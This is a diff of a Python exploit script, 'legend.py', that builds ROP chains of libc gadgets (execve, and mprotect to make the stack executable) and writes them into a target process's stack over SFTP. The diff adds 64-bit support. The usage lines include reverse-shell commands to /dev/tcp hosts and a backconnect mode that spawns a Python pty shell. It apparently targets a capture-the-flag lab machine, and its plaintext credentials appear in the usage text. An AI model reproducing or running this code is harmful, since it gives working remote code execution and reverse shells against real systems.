@@ -104,22 +104,9 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
             log.warning('Missing addresses: {}'.format(list(missing_addrs)))
             sys.exit(0)
     
-    #shift_to_stack_top, shift_to_sftp = shifts
-    #ret_addr, sys_addr, exit_addr, mprot_addr, execve_addr, syscall_addr, iretd_addr = addrs
-    #pusha_ret_addr, push_eax_ret_addr, push_ebx_ret_addr = pushes
-    #popa_ret_addr = popes
     new_stack = b''
-    if   mode == 'mprot':
-        if arch == 32:
-            pass
-        else:
-            pass
-    elif mode == 'test':
-        if arch == 32:
-            pass
-        else:
-            pass
-    elif mode == 'execve':
+
+    if   mode == 'execve':
         if arch == 32:
             dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
 
@@ -132,18 +119,18 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
             for arg in shellcode:
                 ptrs.append(p32(ptrs_addr))
                 ptrs_addr += len(arg)
-            ptrs.append(b'\x00\x00\x00\x00')
+            ptrs.append(p32(0))
 
             code  = b''.join(shellcode) + b''.join(ptrs)
 
-            eax  = bytes([  0,   0,   0,  11][::-1])
+            eax  = p32(11)
             ebx  = p32(dct_addrs['code_addr'])
             ecx  = p32(ptrs_addr)
-            edx  = bytes([  0,   0,   0,   0][::-1])
-            miss = b'\x00\x00\x00\x00'
-            ebp  = bytes([  0,   0,   0,   0][::-1])
-            esi  = bytes([  0,   0,   0,   0][::-1])              
-            edi  = bytes([  0,   0,   0,   0][::-1])
+            edx  = p32(0)
+            miss = p32(0)
+            ebp  = p32(0)
+            esi  = p32(0)             
+            edi  = p32(0)
             registers = edi + esi + ebp + miss + ebx + edx + ecx + eax
 
             code = code + (4 - (len(code) % 4)) * b'\x00'
@@ -155,84 +142,35 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
 
             new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
         else:
-            pass
-    elif mode == 'execve_call':
-        if arch == 32:
             dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
 
-            required_addrs  = ['code_addr', 'popa_ret_addr', 'ret_addr', 'call_esi_addr', 'execve_addr']
+            required_addrs  = ['code_addr', 'syscall', 'ret_addr', 'execve_addr']
+            required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
             check_addrs(required_addrs, dct_addrs.keys())
 
+            #shellcode = [b'/bin/mkdir\x00', b'-p\x00', b'/tmp/elite\x00']
             ptrs = []
             ptrs_addr = dct_addrs['code_addr']
             for arg in shellcode:
-                ptrs.append(p32(ptrs_addr))
+                ptrs.append(p64(ptrs_addr))
                 ptrs_addr += len(arg)
-            ptrs.append(b'\x00\x00\x00\x00')
+            ptrs.append(p64(0))
 
             code  = b''.join(shellcode) + b''.join(ptrs)
-            argv1 = p32(dct_addrs['code_addr'])
-            argv2 = p32(ptrs_addr)
-            argv3 = p32(0)
 
-            eax  = argv1
-            ebx  = argv3
-            ecx  = argv2
-            edx  = argv3
-            miss = p32(0)
-            ebp  = p32(0)
-            esi  = p32(dct_addrs['execve_addr'])         
-            edi  = p32(0)
-            registers = edi + esi + ebp + miss + ebx + edx + ecx + eax
+            argv1 = p64(dct_addrs['code_addr']) # rdi
+            argv2 = p64(ptrs_addr)              # rsi
+            argv3 = p64(0)                      # rdx
 
-            code = code + (4 - (len(code) % 4)) * b'\x00'
+            code = code + (8 - (len(code) % 8)) * b'\x00'
 
-            chain  = p32(dct_addrs['popa_ret_addr']) + registers + 2*p32(dct_addrs['ret_addr'])
-            chain += p32(dct_addrs['call_esi_addr']) + argv1 + argv2 + argv3 + 4*p32(0)
+            chain  = p64(dct_addrs['pop_rdi']) + argv1 + p64(dct_addrs['pop_rsi']) + argv2
+            chain += p64(dct_addrs['pop_rdx']) + argv3
+            chain += p64(dct_addrs['execve_addr'])
 
-            block_length = (len(code) // 4) + len(chain) // 4
+            block_length = (len(code) // 8) + len(chain) // 8
 
-            new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
-        else:
-            pass
-    elif mode == 'system':
-        if arch == 32:
-            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
-
-            required_addrs  = ['code_addr', 'popa_ret_addr', 'ret_addr', 'call_esi_addr', 'system_addr']
-            check_addrs(required_addrs, dct_addrs.keys())
-
-            code  = b''
-            for i in range(len(shellcode)):
-                arg = shellcode[i].replace(b'\00', b'')
-                if i != 0:
-                    arg = b' "' + arg + b'"'
-                code += arg
-            argv1 = p32(dct_addrs['code_addr'])
-            argv2 = p32(0)
-            argv3 = p32(0)
-
-            eax  = p32(0)
-            ebx  = p32(0)
-            ecx  = p32(0)
-            edx  = p32(0)
-            miss = p32(0)
-            ebp  = p32(0)
-            esi  = p32(dct_addrs['system_addr'])         
-            edi  = p32(0)
-            registers = edi + esi + ebp + miss + ebx + edx + ecx + eax
-
-            code = code + (4 - (len(code) % 4)) * b'\x00'
-
-            chain  = p32(dct_addrs['popa_ret_addr']) + registers + 2*p32(dct_addrs['ret_addr'])
-            chain += p32(dct_addrs['call_esi_addr']) + argv1 + argv2 + argv3 + 4*p32(0)
-            chain += p32(dct_addrs['exit_addr'])
-
-            block_length = (len(code) // 4) + len(chain) // 4
-
-            new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
-        else:
-            pass
+            new_stack += code + ( (stack_size // 8) - block_length) * p64(dct_addrs['ret_addr']) + chain
     else:
         if arch == 32:
             dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
@@ -256,7 +194,28 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
 
             new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
         else:
-            pass
+            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
+
+            required_addrs  = ['code_addr', 'syscall', 'ret_addr', 'mprotect_addr']
+            required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
+            check_addrs(required_addrs, dct_addrs.keys())
+
+            code  = shellcode
+
+            argv1 = p64(dct_addrs['code_addr']) # rdi
+            argv2 = p64(stack_size)             # rsi
+            argv3 = p64(7)  # rwx [1+2+4]       # rdx
+            ret   = p64(dct_addrs['code_addr'])
+
+            code = code + (8 - (len(code) % 8)) * b'\x00'
+
+            chain  = p64(dct_addrs['pop_rdi']) + argv1 + p64(dct_addrs['pop_rsi']) + argv2
+            chain += p64(dct_addrs['pop_rdx']) + argv3
+            chain += p64(dct_addrs['mprotect_addr']) + ret
+
+            block_length = (len(code) // 8) + len(chain) // 8
+
+            new_stack += code + ( (stack_size // 8) - block_length) * p64(dct_addrs['ret_addr']) + chain
     return new_stack
 
 
@@ -310,30 +269,20 @@ def main(shellcode, delta_stack, dct_args, libs_args, mode):
     dct_addrs['stack_top_addr']  = int(dct['[stack]']['addr_start'], 16)
     dct_addrs['stack_both_addr'] = int(dct['[stack]']['addr_end'], 16)
 
-    add_addr(shift_to_libc, b'system',   'system_addr',   'system',   'symbol')
-    add_addr(shift_to_libc, b'exit',     'exit_addr',     'exit',     'symbol')
     add_addr(shift_to_libc, b'mprotect', 'mprotect_addr', 'mprotect', 'symbol')
     add_addr(shift_to_libc, b'execve',   'execve_addr',   'execve',   'symbol')
 
-    add_addr(shift_to_libc, b'\x61\xc3', 'popa_ret_addr',     'popa; ret')
-    add_addr(shift_to_libc, b'\x60\xc3', 'pusha_ret_addr',    'pusha; ret')
-    add_addr(shift_to_libc, b'\x50\xc3', 'push_eax_ret_addr', 'push eax; ret')
-    add_addr(shift_to_libc, b'\x53\xc3', 'push_ebx_ret_addr', 'push ebx; ret')
-    add_addr(shift_to_libc, b'\xcd\x80', 'int80h_addr',       'int 0x80')
-    add_addr(shift_to_libc, b'\xc3',     'ret_addr',          'ret')
+    add_addr(shift_to_libc,     b'\xc3',         'ret_addr',          'ret')
 
-    add_addr(shift_to_libc, b'\xff\xd0', 'call_eax_addr',     'call eax')
-    add_addr(shift_to_libc, b'\xff\xd3', 'call_ebx_addr',     'call ebx')
-    add_addr(shift_to_libc, b'\xff\xd1', 'call_ecx_addr',     'call ecx')
-    add_addr(shift_to_libc, b'\xff\xd2', 'call_edx_addr',     'call edx')
-    add_addr(shift_to_libc, b'\xff\xd6', 'call_esi_addr',     'call esi')
-    add_addr(shift_to_libc, b'\xff\xd7', 'call_edi_addr',     'call edi')
-    add_addr(shift_to_libc, b'\xff\xd4', 'call_esp_addr',     'call esp')
-
-    ### ### ### testing ### ### ###
-    if 'sftp' in dct_args:
-        shift_to_sftp = int(dct['sftp-server']['addr_start'], 16)
-    ### ### ### ### ### ### ### ###
+    if arch == 32:
+        add_addr(shift_to_libc, b'\xcd\x80',     'int80h_addr',       'int 0x80')
+        add_addr(shift_to_libc, b'\x61\xc3',     'popa_ret_addr',     'popa; ret')
+        add_addr(shift_to_libc, b'\xff\xd6',     'call_esi_addr',     'call esi')
+    else:
+        add_addr(shift_to_libc, b'\xf5',         'syscall',           'syscall')
+        add_addr(shift_to_libc, b'\x5f\xc3',     'pop_rdi',           'pop rdi; ret')
+        add_addr(shift_to_libc, b'\x5e\xc3',     'pop_rsi',           'pop rsi; ret')
+        add_addr(shift_to_libc, b'\x5a\xc3',     'pop_rdx',           'pop rdx; ret')
 
     if 'sftp' in dct_args:
         m = sftp.open(path_to_mem, 'w+b')
@@ -372,7 +321,7 @@ def main(shellcode, delta_stack, dct_args, libs_args, mode):
 
 
 if __name__ == '__main__':
-    version = '2.0'
+    version = '2.1'
 
     colors = ['','']
     if platform[0:3] == 'lin':
@@ -392,13 +341,9 @@ if __name__ == '__main__':
              version {}
 {}'''.format(colors[0], version, colors[1])
     usage  = '''
-./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -d 4096 -c "/bin/sh -i >& /dev/tcp/192.168.14.14/8080 >&0 >&1"
+./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -c "/bin/bash -pi >& /dev/tcp/10.10.15.59/443 0>&1"
 
-./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -d 4096 -c "/sbin/ifconfig"
-
-./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -c "/bin/bash -pi >& /dev/tcp/10.10.15.59/443 0>&1" -x execve
-
-./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -b "10.10.15.238 443"
+./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -b "10.10.14.197 443"
 '''
 
     parser = ArgumentParser(description=banner,
@@ -423,9 +368,9 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     if   args.cmd:
+        args.func = 'execve'
         args.shellcode = '/bin/bash -c "{}"'.format(args.cmd)
     elif args.backconnect:
-        # ps -o pid,euid,ruid,suid,egid,rgid,sgid,cmd
         args.func = 'execve'
         back_host, back_port = args.backconnect.split()
         args.shellcode  = "import pty,socket,subprocess,os;"
